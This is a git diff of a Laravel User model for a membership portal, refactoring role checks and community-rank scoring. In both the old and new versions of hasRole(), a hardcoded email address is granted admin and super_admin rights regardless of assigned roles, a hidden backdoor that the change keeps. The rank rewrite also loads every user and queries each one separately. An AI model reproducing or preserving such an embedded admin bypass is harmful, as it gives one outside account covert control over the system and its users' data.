@@ -34,7 +34,7 @@ class User extends Authenticatable
         });
     }
 
-    public function hasRole($roles, string $guard = null): bool
+    public function hasRole($roles, ?string $guard = null): bool
     {
         $normalizedRequest = [];
 
@@ -46,14 +46,50 @@ class User extends Authenticatable
 
         foreach ($normalizedRequest as $roleName) {
             $roleName = strtolower((string) $roleName);
-            if ($roleName === 'super_admin' || $roleName === 'admin') {
-                if (strtolower(trim((string) $this->email)) === 'crownpaysme19@gmail.com') {
-                    return true;
-                }
+            if (($roleName === 'super_admin' || $roleName === 'admin') && strtolower(trim((string) $this->email)) === 'crownpaysme19@gmail.com') {
+                return true;
             }
         }
 
-        return parent::hasRole($roles, $guard);
+        $this->loadMissing('roles');
+
+        if (is_string($roles) && str_contains($roles, '|')) {
+            $roles = array_map('trim', explode('|', $roles));
+        }
+
+        if ($roles instanceof \BackedEnum) {
+            $roles = $roles->value;
+            return $this->roles
+                ->when($guard, fn ($q) => $q->where('guard_name', $guard))
+                ->pluck('name')
+                ->contains(fn ($name) => $name instanceof \BackedEnum ? $name->value == $roles : $name == $roles);
+        }
+
+        if (is_array($roles)) {
+            foreach ($roles as $role) {
+                if ($this->hasRole($role, $guard)) {
+                    return true;
+                }
+            }
+
+            return false;
+        }
+
+        if (is_string($roles)) {
+            return $guard
+                ? $this->roles->where('guard_name', $guard)->contains('name', $roles)
+                : $this->roles->contains('name', $roles);
+        }
+
+        if ($roles instanceof Role) {
+            return $this->roles->contains($roles->getKeyName(), $roles->getKey());
+        }
+
+        if ($roles instanceof \Illuminate\Support\Collection) {
+            return $roles->intersect($guard ? $this->roles->where('guard_name', $guard) : $this->roles)->isNotEmpty();
+        }
+
+        return false;
     }
 
     protected $fillable = [
@@ -191,7 +227,7 @@ class User extends Authenticatable
         return $this->hasMany(Course::class, 'created_by');
     }
 
-    // Role Management Methods for NYP-IP Portal
+    // Role Management Methods for APGA Worldwide
 
     /**
      * Initialize user with CPD access and Individual role
@@ -431,30 +467,32 @@ class User extends Authenticatable
      */
     public function calculateCommunityRank(): int
     {
-        // Calculate score based on multiple interactions
+        // Calculate this user's score from the same activity sources used in the dashboard.
         $activitiesScore = $this->activities()->count();
         $trainingScore = $this->enrollments()->where('status', 'completed')->count() * 2;
         $fundingScore = $this->fundingApplications()->where('status', 'approved')->count() * 5;
         $napsScore = \App\Models\NapsRespondent::where('user_id', $this->id)
             ->whereNotNull('survey_completed_at')
-            ->count() * 3; // NAP/S completion is worth 3 points
+            ->count() * 3;
         $communityScore = $this->communityMemberships()->count();
         $eventScore = \App\Models\EventRegistration::where('user_id', $this->id)->count();
 
         $score = $activitiesScore + $trainingScore + $fundingScore + $napsScore + $communityScore + $eventScore;
 
-        // Get users with higher scores
-        $higherRankedCount = self::selectRaw('
-            users.id,
-            (SELECT COUNT(*) FROM activities WHERE activities.user_id = users.id) +
-            (SELECT COUNT(*) FROM course_enrollments WHERE course_enrollments.user_id = users.id AND status = "completed") * 2 +
-            (SELECT COUNT(*) FROM funding_applications WHERE funding_applications.user_id = users.id AND status = "approved") * 5 +
-            (SELECT COUNT(*) FROM naps_respondents WHERE naps_respondents.user_id = users.id AND survey_completed_at IS NOT NULL) * 3 +
-            (SELECT COUNT(*) FROM community_memberships WHERE community_memberships.user_id = users.id) +
-            (SELECT COUNT(*) FROM event_registrations WHERE event_registrations.user_id = users.id) as score
-        ')
-        ->havingRaw('score > ?', [$score])
-        ->count();
+        $higherRankedCount = self::query()->get()->filter(function ($user) use ($score) {
+            $userActivitiesScore = $user->activities()->count();
+            $userTrainingScore = $user->enrollments()->where('status', 'completed')->count() * 2;
+            $userFundingScore = $user->fundingApplications()->where('status', 'approved')->count() * 5;
+            $userNapsScore = \App\Models\NapsRespondent::where('user_id', $user->id)
+                ->whereNotNull('survey_completed_at')
+                ->count() * 3;
+            $userCommunityScore = $user->communityMemberships()->count();
+            $userEventScore = \App\Models\EventRegistration::where('user_id', $user->id)->count();
+
+            $userScore = $userActivitiesScore + $userTrainingScore + $userFundingScore + $userNapsScore + $userCommunityScore + $userEventScore;
+
+            return $userScore > $score;
+        })->count();
 
         $rank = $higherRankedCount + 1;
         $this->update(['community_rank' => $rank]);
